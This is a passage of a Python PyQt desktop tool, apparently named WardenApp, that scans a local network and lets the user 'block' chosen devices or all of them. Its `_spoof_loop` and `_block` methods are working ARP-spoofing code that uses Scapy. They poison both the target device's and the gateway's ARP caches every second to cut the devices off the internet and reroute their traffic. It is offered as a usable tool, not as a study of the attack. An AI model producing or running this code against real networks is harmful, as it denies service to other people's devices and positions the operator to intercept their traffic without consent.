        item = self.table.item(row, 3)
        if item:
            item.setText(ping_s)
            item.setForeground(QColor(color))

    def _show_spoof_count(self, ip: str, count: int):
        """While blocking is active, display the ARP packet count in the Latency column."""
        row = self.ip_to_row.get(ip)
        if row is None:
            return
        item = self.table.item(row, 3)
        if item:
            item.setText(f"ARP x{count}")
            item.setForeground(QColor(DANGER))

    # Block and unblock actions

    def _selected_ips(self):
        """Return a list of IP addresses for all currently selected table rows."""
        rows = {idx.row() for idx in self.table.selectedIndexes()}
        row_to_ip = {v: k for k, v in self.ip_to_row.items()}
        return [row_to_ip[r] for r in rows if r in row_to_ip]

    def _block_selected(self):
        ips = self._selected_ips()
        if not ips:
            _alert(self, "Select a device from the list first.")
            return
        if not self.gateway_mac:
            _alert(self, "Gateway MAC not found. Run Scan Network first.")
            return
        to_block = [ip for ip in ips
                    if self.devices.get(ip, {}).get("status") != "Blocked"]
        if not to_block:
            _alert(self, "Selected device(s) are already blocked.")
            return
        for ip in to_block:
            self._block(ip, self.devices[ip]["mac"])
        self._on_selection_changed()

    def _unblock_selected(self):
        ips = self._selected_ips()
        if not ips:
            _alert(self, "Select a device from the list first.")
            return
        to_unblock = [ip for ip in ips
                      if self.devices.get(ip, {}).get("status") == "Blocked"]
        if not to_unblock:
            _alert(self, "Selected device(s) are not currently blocked.")
            return
        for ip in to_unblock:
            self._unblock(ip, self.devices[ip]["mac"])
        self._on_selection_changed()

    def _block_all(self):
        if not self.gateway_mac:
            _alert(self, "Gateway MAC not found. Run Scan Network first.")
            return
        to_block = [ip for ip, d in self.devices.items()
                    if d.get("status") != "Blocked"]
        if not to_block:
            _alert(self, "All devices are already blocked.")
            return
        for ip in to_block:
            self._block(ip, self.devices[ip]["mac"])
        self._on_selection_changed()

    def _unblock_all(self):
        to_unblock = [ip for ip, d in self.devices.items()
                      if d.get("status") == "Blocked"]
        if not to_unblock:
            _alert(self, "No devices are currently blocked.")
            return
        for ip in to_unblock:
            self._unblock(ip, self.devices[ip]["mac"])
        self._on_selection_changed()

    def _clear_table(self):
        # Silently unblock all devices before clearing to restore their internet access
        for ip, d in list(self.devices.items()):
            if d.get("status") == "Blocked":
                self._unblock(ip, d["mac"])
        self.table.setRowCount(0)
        self.ip_to_row.clear()
        self.devices.clear()
        self.count_lbl.setText("")
        self.stack.setCurrentIndex(0)   # return to the empty state page
        self._set_status("Table cleared — click Scan Network to discover devices", FGDIM)
        self._on_selection_changed()

    def _block(self, ip, mac):
        """Start the ARP spoof loop for the given device and update the UI to reflect blocked state."""
        d = self.devices.get(ip)
        if not d or d.get("running"):
            return
        d["running"] = True
        d["status"]  = "Blocked"
        t = threading.Thread(target=self._spoof_loop, args=(ip, mac), daemon=True)
        d["thread"] = t
        t.start()
        self._ui(lambda i=ip: self._update_row_status(i, "Blocked"))
        self._ui(lambda: self._on_selection_changed())
        self._set_status(f"Blocking {ip} — Latency column counts ARP packets sent", DANGER)

    def _unblock(self, ip, mac):
        """
        Stop the ARP spoof loop and send corrective ARP replies to restore the device's connectivity.

        Five repair packets are sent to each side to overwrite the poisoned ARP cache
        entries before the device can issue new requests.
        """
        d = self.devices.get(ip)
        if not d or not d.get("running"):
            return
        d["running"] = False
        d["status"]  = "Online"
        gw     = self.gateway_ip.strip()
        gw_mac = self.gateway_mac
        try:
            # Restore the target's ARP entry so it knows the real gateway MAC
            sendp(Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac,
                                        psrc=gw, hwsrc=gw_mac),
                  iface=self.iface, count=5, verbose=False)
            # Restore the gateway's ARP entry so it knows the real target MAC
            if gw_mac:
                sendp(Ether(dst=gw_mac) / ARP(op=2, pdst=gw, hwdst=gw_mac,
                                               psrc=ip, hwsrc=mac),
                      iface=self.iface, count=5, verbose=False)
        except Exception:
            pass
        self._ui(lambda i=ip: self._update_row_status(i, "Online"))
        self._ui(lambda i=ip: self._update_ping(i, "—"))
        self._ui(lambda: self._on_selection_changed())
        self._set_status(f"Unblocked {ip} — internet access restored", SUCCESS)

    def _update_row_status(self, ip, status):
        row = self.ip_to_row.get(ip)
        if row is None:
            return
        blocked = status == "Blocked"
        item = self.table.item(row, 4)
        if item:
            item.setText(status)
            item.setForeground(QColor(DANGER if blocked else SUCCESS))
        self._set_row_bg(row, ROW_BLK if blocked else None)

    def _spoof_loop(self, target_ip, target_mac):
        """
        Continuously send spoofed ARP replies to cut the target device's internet access.

        Two packets are sent per cycle:
          1. To the target device: claims our MAC is the gateway, so the target
             sends all outbound traffic to us instead of the real gateway.
          2. To the gateway: claims our MAC is the target, so the gateway sends
             all inbound traffic to us instead of the real device.

        Poisoning both sides simultaneously produces a complete connection cut.
        The loop runs once per second until device["running"] is set to False.
        """
        gw     = self.gateway_ip.strip()
        gw_mac = self.gateway_mac
        my_mac = self.my_mac   # our interface MAC; set hwsrc explicitly only when known
        count  = 0
        while self.devices.get(target_ip, {}).get("running"):
            try:
                # Poison the target: tell it that our MAC is the gateway
                arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gw)
                if my_mac:
                    arp1.hwsrc = my_mac   # set explicitly to avoid Scapy using the wrong default
                sendp(Ether(dst=target_mac) / arp1, iface=self.iface, verbose=False)
                # Poison the gateway: tell it that our MAC is the target device
                if gw_mac:
                    arp2 = ARP(op=2, pdst=gw, hwdst=gw_mac, psrc=target_ip)
                    if my_mac:
                        arp2.hwsrc = my_mac
                    sendp(Ether(dst=gw_mac) / arp2, iface=self.iface, verbose=False)
                count += 1
            except Exception:
                pass   # ignore send errors and retry on the next iteration
            self._ui(lambda i=target_ip, c=count: self._show_spoof_count(i, c))
            time.sleep(1)

    def closeEvent(self, event):
        """Unblock all devices before the window closes so their internet access is restored."""
        for ip, d in list(self.devices.items()):
            if d.get("running"):
                self._unblock(ip, d["mac"])
        time.sleep(0.4)
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyleSheet(APP_STYLE)
    window = WardenApp()
    window.show()
    sys.exit(app.exec_())
